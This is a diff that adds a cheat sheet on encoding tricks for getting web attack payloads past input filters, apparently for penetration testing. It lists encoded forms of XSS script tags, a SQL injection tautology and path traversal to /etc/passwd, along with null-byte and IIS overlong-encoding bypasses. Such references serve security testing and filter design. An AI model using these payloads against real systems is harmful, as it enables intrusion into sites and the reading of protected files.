@@ -1,0 +1,199 @@
+# Encoding Transformations & Bypasses
+
+## ========================================
+## URL ENCODING
+## ========================================
+
+# Single encoding
+%3Cscript%3E → <script>
+%2e%2e%2f → ../
+%22 → "
+%27 → '
+
+# Double encoding
+%253Cscript%253E → %3Cscript%3E → <script>
+%252e%252e%252f → %2e%2e%2f → ../
+
+# Triple encoding
+%25253Cscript%25253E
+
+## ========================================
+## UNICODE ENCODING
+## ========================================
+
+# Unicode escape sequences
+\u003Cscript\u003E → <script>
+\u0022 → "
+\u0027 → '
+\u003C → <
+\u003E → >
+
+# Unicode normalization
+\u0041 → A
+\u00C0 → À (can normalize to A)
+
+## ========================================
+## HTML ENTITY ENCODING
+## ========================================
+
+# Named entities
+&lt;script&gt; → <script>
+&amp; → &
+&quot; → "
+&apos; → '
+
+# Numeric entities
+&#60;script&#62; → <script>
+&#x3C;script&#x3E; → <script>
+&#x22; → "
+&#x27; → '
+
+## ========================================
+## HEX ENCODING
+## ========================================
+
+# Hex encoding
+\x3Cscript\x3E → <script>
+\x2e\x2e\x2f → ../
+\x22 → "
+
+## ========================================
+## OCTAL ENCODING
+## ========================================
+
+# Octal
+\74script\76 → <script>
+\56\56\57 → ../
+
+## ========================================
+## BASE64 ENCODING
+## ========================================
+
+# Base64
+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== → <script>alert(1)</script>
+Li4vLi4vZXRjL3Bhc3N3ZA== → ../../etc/passwd
+
+# Base64 decode in payload
+eval(atob('YWxlcnQoMSk=')) → alert(1)
+
+## ========================================
+## UTF-7 ENCODING
+## ========================================
+
+# UTF-7 XSS
++ADw-script+AD4-alert(1)+ADw-/script+AD4-
+
+## ========================================
+## UTF-16 ENCODING
+## ========================================
+
+# UTF-16 BE/LE
+%u003Cscript%u003E
+
+## ========================================
+## NULL BYTE INJECTION
+## ========================================
+
+%00
+\x00
+\0
+
+# Example
+../../etc/passwd%00.jpg
+file.php%00.txt
+
+## ========================================
+## MIXED ENCODING
+## ========================================
+
+# Combine encodings
+%3C%73%63%72%69%70%74%3E → <script>
+\u003C\u0073\u0063\u0072\u0069\u0070\u0074\u003E → <script>
+
+## ========================================
+## CASE VARIATIONS
+## ========================================
+
+<ScRiPt>
+<SCRIPT>
+<sCrIpT>
+
+## ========================================
+## COMMENT TRICKS
+## ========================================
+
+<scr<!--comment-->ipt>
+<scr/*comment*/ipt>
+
+## ========================================
+## WHITESPACE ENCODING
+## ========================================
+
+# Tab, newline, carriage return
+<script\talert(1)</script>
+<script\nalert(1)</script>
+<script\ralert(1)</script>
+
+## ========================================
+## IIS/ASP.NET ENCODING
+## ========================================
+
+# IIS Unicode encoding
+..%c0%af..%c0%af
+..%c1%9c..%c1%9c
+
+## ========================================
+## JAVA/JSP ENCODING
+## ========================================
+
+# Unicode in Java
+\u002e\u002e\u002f
+
+## ========================================
+## BYPASS EXAMPLES
+## ========================================
+
+# SQL Injection
+' OR '1'='1
+%27%20OR%20%271%27=%271
+\u0027\u0020OR\u0020\u00271\u0027=\u00271
+
+# XSS
+<script>alert(1)</script>
+%3Cscript%3Ealert(1)%3C/script%3E
+\u003Cscript\u003Ealert(1)\u003C/script\u003E
+&#60;script&#62;alert(1)&#60;/script&#62;
+
+# Path Traversal
+../../../etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002fetc/passwd
+
+## ========================================
+## TOOLS
+## ========================================
+
+# URL encoding
+echo -n "test" | xxd -p | sed 's/\(..\)/%\1/g'
+
+# Base64
+echo "test" | base64
+echo "dGVzdA==" | base64 -d
+
+# HTML entities
+# Use online converters or:
+python -c "import html; print(html.escape('<script>'))"
+
+# Unicode
+python -c "print('\\u003Cscript\\u003E')"
+
+## ========================================
+## TESTING
+## ========================================
+
+# Test different encodings
+1. Single encoding
+2. Double encoding
+3. Mixed encodings
+4. Case variations
+5. Unicode normalization
